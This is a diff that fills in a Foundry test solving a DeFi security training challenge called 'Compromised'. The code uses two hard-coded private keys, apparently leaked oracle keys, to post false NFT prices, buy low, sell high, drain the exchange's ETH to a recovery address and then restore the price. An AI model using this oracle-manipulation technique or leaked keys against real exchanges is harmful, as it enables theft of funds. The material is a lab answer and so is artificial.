@@ -75,7 +75,63 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+        // 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159 
+
+        console.log(address(exchange).balance, 'exchange balance');
+
+        address someUser1 = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        address someUser2 = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+
+        console.log(someUser1, 'someUser1');
+        console.log(someUser2, 'someUser2');
+
+        console.log(oracle.getMedianPrice(nft.symbol()), 'getMedianPrice');
+
+        vm.stopPrank();
+        vm.startPrank(someUser1);
+        oracle.postPrice(nft.symbol(), 1);
+
+        console.log(oracle.getMedianPrice(nft.symbol()), 'getMedianPrice');
+
+        vm.stopPrank();
+        vm.startPrank(someUser2);
+        oracle.postPrice(nft.symbol(), 1);
+
+        console.log(oracle.getMedianPrice(nft.symbol()), 'getMedianPrice');
+
+        vm.stopPrank();
+        vm.startPrank(player);
+
+        uint256 id = exchange.buyOne{value: 1}();
+
+        vm.stopPrank();
+        vm.startPrank(someUser1);
+        oracle.postPrice(nft.symbol(), 999000000000000000001);
+
+        vm.stopPrank();
+        vm.startPrank(someUser2);
+        oracle.postPrice(nft.symbol(), 999000000000000000001);
+
+        console.log(oracle.getMedianPrice(nft.symbol()), 'getMedianPrice');
+
+        vm.stopPrank();
+        vm.startPrank(player);
+
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        console.log(address(exchange).balance, 'exchange balance');
+
+        (bool success,) = address(recovery).call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        require(success);
+
+        vm.stopPrank();
+        vm.startPrank(someUser1);
+        oracle.postPrice(nft.symbol(), 999000000000000000000);
+
+        vm.stopPrank();
+        vm.startPrank(someUser2);
+        oracle.postPrice(nft.symbol(), 999000000000000000000);
     }
 
     /**
